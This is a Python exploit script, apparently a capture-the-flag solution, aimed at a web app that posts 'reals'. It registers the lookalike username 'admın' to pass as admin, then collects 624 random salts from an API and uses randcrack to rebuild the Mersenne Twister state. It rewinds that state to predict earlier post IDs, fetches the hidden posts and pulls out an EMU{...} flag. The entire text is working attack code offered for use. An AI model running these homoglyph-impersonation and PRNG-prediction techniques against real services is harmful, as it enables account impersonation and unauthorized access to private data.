#!/usr/bin/env python3
import hashlib
import re
import sys

import requests
from randcrack import RandCrack

base_url = sys.argv[1].rstrip("/")
session = requests.Session()

# Step 1: Register as admin
session.post(
    f"{base_url}/signup",
    data={
        "username": "admın",
        "password": "password",
    },
)

print(f"[+] Step 1 - Registered as admin user 'admın'")

# Step 2: Get the 500 admin logs (counters 1501-2000)
first_500_admin_logs = session.get(f"{base_url}/api/self/recent-reals").json()

print(f"[+] Step 2 - Retrieved first 500 admin logs")

# Step 3: Post 124 more reals (counters 2001-2124)
for i in range(124):
    res = session.post(
        f"{base_url}/post",
        data={
            "category": "perspective",
            "title": f"Post {i}",
            "content": f"Content {i}",
        },
    )

    assert res.ok, f"Failed to post real {i}: {res.status_code} {res.reason}"


print(f"[+] Step 3 - Posted 124 more reals")

# Step 4: Query global-logs again for all records (counters 1501-2124)
last_124_admin_logs = session.get(f"{base_url}/api/self/recent-reals").json()[-124:]

all_logs = first_500_admin_logs + last_124_admin_logs

assert len(all_logs) == 624, f"Expected 624 logs, got {len(all_logs)}"

print(f"[+] Step 4 - Retrieved all logs")

# Step 5: Recover PRNG state
cracker = RandCrack()
for real in all_logs:
    cracker.submit(real["real_salt"])

print(f"[+] Step 5 - Recovered PRNG state")

# Step 6: Rewind the RNG stream to counter 500
# Rewind to 1500
cracker.offset(-624)
# Rewind to 500 (counter 500 = RNG index 499, from position 0 which is RNG index 1500: need -1001)
cracker.offset(-1001)

print(f"[+] Step 6 - Rewound RNG to counter 500")

# Step 7: Predict the next 501 real_ids (counters 500-1000) and query them
for counter_id in range(500, 1001):
    salt = cracker.predict_getrandbits(32)
    real_id = hashlib.sha256(f"{counter_id}:{salt}".encode()).hexdigest()
    response = session.get(f"{base_url}/api/real/{real_id}")
    if response.ok:
        match = re.search(r"EMU\{[^}]+\}", response.text)
        if match:
            print(match.group())
            break

else:
    raise SystemExit("flag real not found")
